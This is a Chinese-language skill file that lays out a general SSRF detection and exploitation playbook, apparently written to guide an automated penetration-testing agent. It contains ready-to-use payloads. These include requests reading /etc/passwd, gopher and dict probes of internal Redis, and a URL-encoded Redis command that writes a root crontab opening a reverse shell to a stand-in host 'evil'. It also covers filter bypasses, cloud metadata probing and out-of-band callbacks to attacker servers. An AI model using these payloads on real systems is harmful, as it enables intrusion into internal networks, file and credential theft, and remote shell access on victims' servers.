---
name: vulhub-ssrf
description: ssrf 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# SSRF 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

SSRF（服务器端请求伪造）的核心是诱导目标服务器向一个由攻击者控制的地址发起HTTP或其他协议的网络请求。探测的关键在于寻找应用程序中所有可能接受URL或网络地址作为输入的功能点。

基于提供的实例，抽象探测模式如下：

1.  **功能点识别**：
    *   **数据导入/导出功能**：寻找允许从外部URL导入数据（如RSS订阅、头像设置、文件上传、地图瓦片服务）或向外部服务发送数据的接口。
    *   **内部服务调用**：寻找调用内部API、数据库、缓存（如Redis）、搜索服务（如Elasticsearch）或反向代理配置的端点。
    *   **开发/调试接口**：应用程序的管理面板、测试接口（如`TestWfsPost`）、服务发现（如`UDDI Explorer`）或SOAP/WSDL解析端点通常是高危目标。
    *   **文件处理功能**：任何处理外部URL以获取文件内容的功能，如图片处理、文档转换、PDF生成等。

2.  **参数与头部探测**：
    *   **关键参数名**：重点关注名称中包含 `url`、`uri`、`path`、`source`、`file`、`document`、`server`、`address`、`host`、`api`、`endpoint`、`operator`、`redirect`、`proxy` 等词汇的参数。
    *   **HTTP头部注入**：注意 `Host` 头部。在某些反向代理或负载均衡场景下，服务器可能信任并转发 `Host` 头，将其作为内部请求的目标。
    *   **协议处理**：尝试使用不同协议前缀，如 `http://`、`https://`、`file://`、`gopher://`、`dict://`、`ftp://`，甚至是非标准格式如 `unix:`（用于访问Unix域套接字）。

3.  **请求上下文分析**：
    *   **SOAP/XML请求**：检查SOAP消息体中是否存在 `<xop:Include>`、`<import>`、`<location>` 等标签，其 `href` 或类似属性可能接受外部URL。
    *   **表单与JSON数据**：在POST请求的`application/x-www-form-urlencoded`、`multipart/form-data`或`application/json`载荷中，寻找上述关键参数。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体CVE编号，按执行上下文分类。

### 上下文：常规HTTP参数注入
当发现一个参数（如`url`、`operator`）直接用于发起后端请求时使用。
```http
GET /some/endpoint?url=http://attacker-controlled.com HTTP/1.1
```
```http
POST /some/endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://internal-service.local/&body=test&username=admin
```
```http
GET /uddiexplorer/SomePage.jsp?operator=http://127.0.0.1:7001 HTTP/1.1
```

### 上下文：利用非HTTP协议访问内部服务
用于攻击Redis、Memcached等无验证的内部服务，或读取本地文件。
```http
GET /vuln?path=file:///etc/passwd HTTP/1.1
```
```http
GET /vuln?server=dict://127.0.0.1:6379/info HTTP/1.1
```
```http
GET /vuln?server=gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a HTTP/1.1
```
**针对Redis的特定Payload（URL编码后）**：
```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```
*（此Payload通过Redis写入计划任务实现反弹Shell）*

### 上下文：SOAP/XML请求中的外部实体引用
在支持XOP（XML-binary Optimized Packaging）或类似特性的SOAP服务中。
```xml
POST /soap/endpoint HTTP/1.1
Content-Type: multipart/related; boundary=example-boundary

--example-boundary
Content-Type: application/xop+xml; charset=UTF-8

<soap:Envelope>
  <soap:Body>
    <data>
      <xop:Include href="file:///etc/hosts"/>
    </data>
  </soap:Body>
</soap:Envelope>
--example-boundary--
```

### 上下文：利用反向代理或负载均衡器逻辑缺陷
通过构造超长或特殊格式的路径，欺骗代理服务器将请求转发到错误的后端。
```http
GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
```

### 上下文：数据库连接字符串中的主机字段
某些管理界面（如数据库Web客户端）在连接外部服务时，其“服务器地址”字段可能存在SSRF。
```
example.com:9200
```
*（假设目标是诱导服务器连接至 `example.com` 的9200端口，例如Elasticsearch）*

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **绕过 `http(s)://` 黑名单或白名单**：
    *   **使用其他协议**：`file://`、`gopher://`、`dict://`、`ftp://`、`ldap://`。
    *   **畸形URL**：`http://127.0.0.1:80@attacker.com`、`http://attacker.com#@127.0.0.1`（利用URL解析差异）。
    *   **IP地址编码**：八进制(`0177.0.0.1`)、十六进制(`0x7f.0.0.1`)、十进制整数(`2130706433`)。
    *   **利用DNS重绑定**：控制一个域名，使其在短时间内解析为外部IP（用于通过黑名单检查），随后解析为内部IP（用于实际攻击）。

2.  **绕过端口限制**：
    *   尝试非标准端口上的HTTP服务（如3000, 8080, 8443）。
    *   利用 `:` 后接端口号，或尝试URL格式如 `http://attacker.com:80/`。

3.  **利用 `Host` 头部**：
    *   当应用程序使用 `Host` 头来决定内部请求的目标时，可以构造如下请求：
    ```http
    GET /internal/proxy/endpoint HTTP/1.1
    Host: internal-target.local
    ```
    *   配合路径遍历等技巧，可能访问到非预期的内部服务。

4.  **路径遍历与规范化**：
    *   在URL路径中插入 `../` 以尝试访问非预期资源或服务。
    ```http
    POST /geoserver/TestWfsPost HTTP/1.1
    ...
    url=http://internal/geoserver/../&body=test
    ```

## [4] 回显与成功判定基准 (Verification)

1.  **直接回显 (Blind SSRF 除外)**：
    *   如果服务器的响应中包含了所请求外部资源的内容（如文件内容、网页HTML、API返回的JSON），则漏洞存在且可利用。
    *   **判定基准**：在响应体中搜索已知内容，如请求 `file:///etc/passwd` 后查找 `root:`，请求 `http://169.254.169.254/latest/meta-data/`（AWS元数据）后查找特定键名。

2.  **时间延迟**：
    *   请求一个由你控制的、会故意延迟响应的服务器（如 `http://your-server/delay=5`），观察目标应用程序的响应时间是否显著增加。
    *   **判定基准**：响应时间与你设定的延迟时间基本吻合。

3.  **带外 (OOB) 技术**：
    *   这是验证 **Blind SSRF**（无回显）的最可靠方法。
    *   **DNS查询**：让服务器请求一个类似 `http://unique-id.attacker-dns-server.com/` 的地址。如果你控制的DNS服务器收到了对 `unique-id.attacker-dns-server.com` 的查询，则证明SSRF存在。
    *   **HTTP请求**：使用类似 `http://attacker-server.com/` 的地址，并确保你的服务器有公开可访问的Web服务（如 `nc -lvp 80` 或 `python3 -m http.server 80`）。如果收到来自目标服务器IP的HTTP请求（检查User-Agent、源IP等），则漏洞存在。
    *   **判定基准**：在你的OOB服务器（DNS/HTTP）上确认收到了来自目标服务器IP的请求。

4.  **错误信息差异**：
    *   分别请求一个有效的内部地址和一个无效的/被过滤的地址。观察应用程序返回的错误信息是否不同（例如，连接被拒 vs. URL无效）。这种差异可以间接证实请求被发出。
    *   **判定基准**：针对不同输入，错误消息在内容、状态码或响应时间上存在可区分的模式。